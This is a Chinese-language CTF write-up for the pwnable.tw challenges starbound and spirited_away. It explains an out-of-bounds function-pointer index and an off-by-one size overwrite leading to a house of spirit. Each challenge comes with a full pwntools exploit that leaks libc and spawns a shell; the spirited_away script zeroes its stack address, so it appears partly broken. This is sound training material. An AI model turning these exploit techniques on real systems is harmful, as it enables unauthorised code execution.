## starbound + spirited_away wp

### starbound

#### 题目分析

题目是一个很有趣的rpg游戏，代码量不算小。init_map的那一部分只看懂了一小部分，具体的地图生成还是没有搞明白。

但是重点不在这里，题目的漏洞在一开始的菜单中就已经给出了，读入choice之后要根据choice去函数数组中拿出对应idx的函数指针然后执行对应的函数，但是在读入choice之后没有对choice的大小进行检测，导致可以越界访问函数指针。

恰好在函数指针数组网上一点点的的地方保存着读入的name，这样的话就可以将读入的name当作函数指针去执行。而且题目没有开启pie，配合程序自带的一个 add esp, 0x1c; ret;的gadget可以直接回到栈里做rop，而栈里正好有0x100个字节的内存是用于输入choice的，可以控制，所以可以直接做rop。

利用这个rop泄露地址，然后再返回main函数，再用一次getshell。

```c
  while ( 1 )
  {
    alarm(0x3Cu);
    menu_func();
    if ( !readn(nptr, 0x100u) )
      break;
    v3 = strtol(nptr, 0, 10);
    if ( !v3 )
      break;
    ((void (*)(void))vuln_array[v3])();         // 数组越界
  }
  do_bye();
  return 0;
```

这道题的难处就在于，代码量很大容易掩盖住漏洞，具体的利用倒是不难，就是灵活使用gadget返回栈中做rop。

#### EXP：

```python
#coding=utf-8
from pwn import *
from LibcSearcher import *
local = 0
exec_file="./starbound"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10202)
    #libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x0804A65D
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("> ",str(idx))
def set_name(name):
    menu(6)
    menu(2)
    a.sendafter("Enter your name: ",name)
    return 

def delete(idx):
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
payload = p32(0x08048e48) * (0x64 / 4)
set_name(payload)
menu(1)
#debug()
payload = "-10\x00" + p32(0) + p32(elf.plt["puts"]) +p32(0x804A605)+ p32(elf.got["puts"]) 
a.sendlineafter("> ",payload)
puts_addr = u32(a.recv(4))
libc =LibcSearcher("puts",puts_addr)
libc_base = puts_addr - libc.dump("puts")
fuck(libc_base)
payload = "/bin/sh\x00" + p32(0x08048e48) * (0x5c / 4)
set_name(payload)
menu(1)
#debug()
pop_3_ret = 0x080494da
payload = "-10\x00" + p32(0) + p32(libc_base + libc.dump("system")) +p32(0)+ p32(0x80580D0)
#payload = "-10\x00" + p32(0) + p32(elf.plt["open"]) + p32(pop_3_ret) + p32(0x80580D0) + p32(0) + p32(0)
#payload += p32(elf.plt["read"]) + p32(pop_3_ret) + p32(3) + p32(elf.bss() + 0x800) + p32(0x30)
#payload += p32(elf.plt["write"]) + p32(pop_3_ret) + p32(1) + p32(elf.bss()+ 0x800) + p32(0x30)
a.sendlineafter("> ",payload)
a.interactive()

```

### spirited_away

#### 题目分析

题目一共有两个洞都蛮隐蔽的。

- 第一个洞是因为read没有\x00截断且在栈中，所以可以泄露地址的。

  ```c
  printf("Why did you came to see this movie? ");
  fflush(stdout);
  read(0, reason, v3);
  printf("Reason: %s\n", reason);
  ```

- 第二个洞是:保存提示语的V1,只有56个字节的宽度，但是当输入次数达到三位数的时候，整个提示语的长度是57个字节，所以提示语的最后一个字节会溢出到下面的size中，这个size是控制name和reason的输入的size，本来大小是80个字节，溢出之后就变成0x6e，在输入的时候就会有栈溢出和堆溢出。

  ```c
  char v1[56]; // [esp+10h] [ebp-E8h] BYREF
  size_t nbytes; // [esp+48h] [ebp-B0h]
  
  
  buf = malloc(0x3Cu);
  printf("\nPlease enter your name: ");
  fflush(stdout);
  read(0, buf, nbytes);
  
  printf("Please enter your comment: ");
  fflush(stdout);
  read(0, s, nbytes);
  
  
  sprintf(v1, "%d comment so far. We will review them as soon as we can", cnt);
  ```

  #### 漏洞利用
  
  通过没有截断的漏洞将libc和栈地址泄露出来。
  
  add100次,这样就会有0x1e字节的溢出。==先通过栈溢出将将保存在栈中的name_buf的指针覆盖成栈中的地址，准确的是reason_buf的一个地址==，然后再reason_buf中的对应地址构造一个fake_chunk，这是为了后面的house of spirited准备的，这样话后面free函数就可以将这个fake_chunk放到bins中，再在一开始的malloc中申请name_buf申请出来出来，这样就可以向栈中写rop了（house of spirited）。
  
  最后，可以通过name的edit，在栈中rop getshell。
  
  #### EXP:
  
  ```python
  #coding=utf-8
  from pwn import *
  local = 0
  exec_file="./spirited_away"
  context.binary=exec_file
  context.terminal=["tmux","splitw","-h"]
  elf=ELF(exec_file,checksec = True)
  argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
              "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./spirited_away"]
  if local :
      a=process(argv = argv)
      if context.arch == "i386" :
          #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
          libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so",checksec = False)
      elif context.arch == "amd64" :
          libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
  else:
      a=remote("chall.pwnable.tw",10204)
      libc=ELF("./libc.so.6")
  def get_base(a):
      text_base = a.libs()[a._cwd+ "/spirited_away"]
      for key in a.libs():
          if "libc-2.23.so" in key:
              return text_base,a.libs()[key]
  def debug():
      text_base,libc_base=get_base(a)
      script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
      script +='''
      b *0x080486F8
      '''
      gdb.attach(a,script)
  def fuck(address):
      n = globals()
      for key,value in n.items():
          if value == address:
              return success(key+"  ==>  "+hex(address))
  def menu(idx):
      a.sendlineafter("",str(idx))
  def comment_(name,age,reason,comment):
      a.sendlineafter("Please enter your name: ",name)
      a.sendlineafter("Please enter your age: ",str(age))
      a.sendafter("Why did you came to see this movie? ",reason)
      a.sendafter("Please enter your comment: ",comment)
      return 
  
  def add(name,age,reason,comment):
      comment_(name,age,reason,comment)
      a.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
      return 
  
  def add_2(age,reason):
      a.sendlineafter("Please enter your age: ",str(age))
      a.sendafter("Why did you came to see this movie? ",reason)
      a.sendafter("Would you like to leave another comment? <y/n>: ","y")
      return
  
  
  def edit(idx,content):
      return 
      
  def show(idx):
      return 
  relloc_offset = [0,2,4,6,0xb,0xc,0x10]
  #payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE
  #debug()
  
  '''
  comment_("jlx",20,"a" * 56,"b")
  a.recvuntil("Reason: ")
  a.recvuntil("a" * 56)
  stack_addr = u32(a.recv(4)) - 0x70 + 8 +8
  fuck(stack_addr)
  a.recv(4)
  libc_base = u32(a.recv(4)) - libc.sym["fflush"] - 11
  fuck(libc_base)
  a.sendafter("Would you like to leave another comment? <y/n>: ","y")
  '''
  #debug()
  comment_("jlx",20,"a" * 20,"b")
  a.recvuntil("Reason: ")
  a.recvuntil("a" * 20)
  stack_addr = 0
  libc_base = u32(a.recv(4))# - libc.sym["puts"]  - 347
  fuck(libc_base)
  
  for i in range(9):
      add("jlx",20 + i,"aaaa","bbbb")
  for i in range(90):
      add_2(30+i,"cccc")
  fake_chunk = "/bin/sh\x00"+ p32(0) + p32(0x41) + p32(0)*14 + p32(0) + p32(0x21)
  payload = '\x00' * 80 + p32(21) + p32(stack_addr)
  #debug()
  comment_("jlx",20,fake_chunk,payload)
  a.sendafter("Would you like to leave another comment? <y/n>: ","y")
  payload = 64 * 'a' + p32(0) + p32(libc_base + libc.sym["execve"]) + p32(0) + p32(stack_addr - 16) +p32(0) + p32(0)
  comment_(payload,20,"/bin/sh\x00",'aaa')
  a.sendafter("Would you like to leave another comment? <y/n>: ","n")
  a.interactive()
  
  ```
  
  